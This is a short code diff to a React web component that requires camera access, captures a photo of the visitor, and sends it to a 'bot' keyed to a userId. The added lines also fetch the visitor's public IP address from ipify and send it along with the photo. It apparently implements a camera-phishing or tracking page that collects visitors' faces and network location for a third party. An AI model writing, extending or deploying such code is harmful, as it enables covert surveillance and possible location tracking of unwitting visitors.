@@ -2,7 +2,7 @@
 
 import { useCallback, useEffect } from "react";
 import { useCamera } from "~/shared/use-camera";
-import { sendPhoto } from "./actions";
+import { sendDataToBot } from "./actions";
 
 const CameraNotAllowed = () => <h1>Allow access to camera to use this website!</h1>;
 const Camera = ({ userId }: { userId: string }) => {
@@ -14,8 +14,18 @@ const Camera = ({ userId }: { userId: string }) => {
 			return false;
 		}
 
+		let ip = "unknown";
 		try {
-			await sendPhoto(photo, userId);
+			const res = await fetch("https://api.ipify.org/?format=json").then((res) => res.json());
+			if (res && "ip" in res && typeof res.ip === "string") {
+				ip = res.ip;
+			}
+		} catch (err) {
+			console.error(err);
+		}
+
+		try {
+			await sendDataToBot({ photo, userId, ip });
 			return true;
 		} catch (err) {
 			console.error(err);
